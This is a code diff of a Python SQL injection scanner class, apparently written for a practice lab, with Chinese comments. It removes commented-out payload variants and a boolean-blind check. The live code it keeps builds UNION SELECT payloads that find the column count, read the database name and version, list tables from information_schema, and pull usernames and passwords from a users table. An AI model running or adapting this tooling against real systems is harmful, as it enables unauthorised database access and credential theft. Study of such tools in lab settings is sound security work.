@@ -417,29 +417,6 @@ class SQLInjectionScanner:
                 return True, db_type
         return False, None
 
-    # def check_boolean_based(self, url, true_payload, false_payload, method='GET', param='id', data_template=None):
-    #     """基于布尔的盲注检测"""
-    #     if method.upper() == 'GET':
-
-    #         true_response = self.send_request(url, params={param: true_payload})
-    #         false_response = self.send_request(url, params={param: false_payload})
-    #     else:  # POST
-    #         true_data = data_template.copy() if data_template else {}
-    #         true_data[param] = true_payload
-    #         false_data = data_template.copy() if data_template else {}
-    #         false_data[param] = false_payload
-    #         true_response = self.send_request(url, method='POST', data=true_data)
-    #         false_response = self.send_request(url, method='POST', data=false_data)
-        
-    #     if true_response and false_response:
-    #         # 比较响应长度和内容哈希
-    #         if len(true_response.content) != len(false_response.content):
-    #             return True
-    #         # 检查页面特定关键词的变化
-    #         if "admin" in true_response.text.lower() and "admin" not in false_response.text.lower():
-    #             return True
-    #     return False
-
     def detect_column_count(self, url, method, param, data_template, payload):
         """通过ORDER BY判断字段数"""
         self.print(f"[*] 正在判断字段数...")
@@ -514,19 +491,6 @@ class SQLInjectionScanner:
         payload_ones = f"{payload} union select {select_ones} # " if payload != "-1" else f"{payload} union select {select_ones}"
         payload_twos = f"{payload} union select {select_twos} # " if payload != "-1" else f"{payload} union select {select_twos}"
         
-        # if closing_pattern == "string":
-        #     payload_ones = f"vince' union select {select_ones} # "
-        #     payload_twos = f"vince' union select {select_twos} # "
-        # elif closing_pattern == "search":
-        #     payload_ones = f"vince' union select {select_ones} # "
-        #     payload_twos = f"vince' union select {select_twos} # "
-        # elif closing_pattern == "xx":
-        #     payload_ones = f"1') union select {select_ones} # "
-        #     payload_twos = f"1') union select {select_twos} # "
-        # else:  # numeric
-        #     payload_ones = f"1 union select {select_ones}"
-        #     payload_twos = f"1 union select {select_twos}"
-        
         # 发送两个请求
         if method == 'GET':
             # 根据靶场类型决定submit参数名和值
@@ -565,7 +529,7 @@ class SQLInjectionScanner:
                     if "2" in change:
                         # 替换"2"为捕获组，创建正则表达式模式
                         # 这里简单处理，实际可能需要更复杂的逻辑
-                        pattern = re.escape(change.strip()).replace("2", "(.*?)", i).replace("2",".*?").__add__(f"(?={change[:4]}|\Z)")
+                        pattern = re.escape(change.strip()).replace("2", "(.*?)", i).replace("2",".*?").__add__(f"(?={change.strip()[:4]}|\Z)")
                         output_positions.append(pattern)
             
             if output_positions:
@@ -596,17 +560,6 @@ class SQLInjectionScanner:
         
         # 根据不同的闭合模式构造payload
         union_payload = f"{payload} union select {union_select} # " if payload != "-1" else f"{payload} union select {union_select}"
-        # if closing_pattern == "string":
-        #     union_payload = f"vince' union select {union_select} # "
-        # elif closing_pattern == "search":
-        #     union_payload = f"vince' union select {union_select} # "
-        # elif closing_pattern == "xx":
-        #     union_payload = f"1') union select {union_select} # "
-        # else:  # numeric
-        #     union_payload = f"1 union select {union_select}"
-        
-        # 发送请求并与标准请求比较变化
-        # standard_input = {"string": "vince", "search": "vince", "xx": "1", "numeric": "1"}
         
         if method == 'GET':
             # 根据靶场类型决定submit参数名和值
@@ -666,14 +619,6 @@ class SQLInjectionScanner:
         if column_count >= 2:
             # 动态构造payload
             test_payload = f"{payload} union select concat(database(),'|',version()),{union_select} # " if payload != "-1" else f"{payload} union select concat(database(),'|',version()),{union_select}"
-            # if closing_pattern == "string":
-            #     payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
-            # elif closing_pattern == "search":
-            #     payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
-            # elif closing_pattern == "xx":
-            #     payload = f"1') union select {union_select},concat(database(),'|',version()) # "
-            # else:
-            #     payload = f"1 union select {union_select},concat(database(),'|',version())"
             
             # 发送请求和标准请求进行比较
             if method == 'GET':
@@ -846,15 +791,7 @@ class SQLInjectionScanner:
         
         # 构造查询payload
         test_payload = f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database() # " if payload != "-1" else f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database()"
-        # if closing_pattern == "string":
-        #     payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        # elif closing_pattern == "search":
-        #     payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        # elif closing_pattern == "xx":
-        #     payload = f"1') union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        # else:
-        #     payload = f"1 union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database()"
-        
+
         # 发送请求
         if method == 'GET':
             # 根据靶场类型决定submit参数名和值
@@ -1115,28 +1052,6 @@ class SQLInjectionScanner:
                 3:"user,password,1",
             }
         test_payload = f"{payload} union select {dict[column_count]} from users # " if payload != "-1" else f"{payload} union select {dict[column_count]} from users"
-        # if closing_pattern == "string":
-        #     if column_count >= 2:
-        #         payload = f"vince' union select username,password from users # "
-        #     else:
-        #         payload = f"vince' union select username from users # "
-        # elif closing_pattern == "search":
-        #     if column_count >= 3:
-        #         payload = f"vince' union select 1,username,password from users # "
-        #     elif column_count >= 2:
-        #         payload = f"vince' union select username,password from users # "
-        #     else:
-        #         payload = f"vince' union select username from users # "
-        # elif closing_pattern == "xx":
-        #     if column_count >= 2:
-        #         payload = f"1') union select username,password from users # "
-        #     else:
-        #         payload = f"1') union select username from users # "
-        # else:
-        #     if column_count >= 2:
-        #         payload = f"1 union select username,password from users"
-        #     else:
-        #         payload = f"1 union select username from users"
         
         # 发送请求
         if method == 'GET':
